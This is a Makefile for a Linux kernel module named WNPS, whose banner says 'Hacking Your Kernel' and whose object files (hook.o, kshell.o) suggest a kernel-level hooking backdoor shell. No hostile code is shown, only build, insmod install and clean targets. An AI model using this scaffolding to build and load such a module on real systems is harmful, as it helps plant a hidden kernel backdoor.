obj-m += wnps.o
wnps-objs := hook.o kshell.o
KERNELBUILD := /lib/modules/$(shell uname -r)/build

default:
	@echo
	@echo "+--------------------------------------------------------------+"
	@echo "			WNPS Is Not Poc Shell                          "
	@echo "			Version 0.26  by wzt                           "
	@echo "			http://www.xsec.org                            "
	@echo "			Hacking Your Kernel                            "
	@echo "+--------------------------------------------------------------+"

	make -C $(KERNELBUILD) M=$(shell pwd) modules

install:
	insmod ./wnps.ko
clean:
	rm -f *.o *.cmd *.ko *.mod.c
